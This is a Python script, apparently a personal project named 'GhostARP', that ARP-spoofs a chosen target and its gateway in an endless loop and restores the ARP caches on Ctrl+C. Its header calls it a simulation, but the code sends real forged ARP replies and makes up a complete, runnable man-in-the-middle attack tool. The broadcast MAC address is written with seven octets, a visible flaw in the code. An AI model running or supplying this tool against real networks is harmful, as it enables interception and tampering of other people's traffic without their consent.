#!/usr/bin/env python3

"""
GhostARP Tool v1.0

Author: Devansh Solanki

Features:
- ARP Spoofing Simulation (Target ↔ Gateway)
- Continuous Packet Transmission Loop
- ARP Cache Restoration on Exit (Ctrl+C)
- Target MAC Resolution via ARP Requests
- Clean Terminal Status Acknowledgements (Professional Output)

"""

import scapy.all as scapy
import time
import logging
import termios
import sys

# Disable ^C echo
fd = sys.stdin.fileno()
old_settings = termios.tcgetattr(fd)
new_settings = termios.tcgetattr(fd)
new_settings[3] &= ~termios.ECHOCTL
termios.tcsetattr(fd, termios.TCSANOW, new_settings)

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answered_list = scapy.srp(
        arp_request_broadcast,
        timeout=2,
        verbose=False
    )[0]

    if not answered_list:
        raise RuntimeError(f"No ARP reply received from {ip}. Is it online and on the same network?")

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    scapy.send(packet, count=4, verbose=False)


try:
    target_ip = input("[+] Enter your target IP: ").strip()
    gateway_ip = input("[+] Enter the gateway IP (your router's IP): ").strip()

    print("\n[+] Spoofing your target " + target_ip + "....")
    time.sleep(1)
    print("[+] Sending packets.....")

    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    print("\nDetected ctrl+c...")
    time.sleep(1)
    print("Resetting ARP Tables.....")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    time.sleep(1)
    print("Original ARP Tables are set....")
    time.sleep(1)
    print("Spoofing completed successfully...")
    sys.exit(0)

except Exception as e:
    print("\n[-] " + str(e))
    sys.exit(1)

finally:
    termios.tcsetattr(fd, termios.TCSANOW, old_settings)
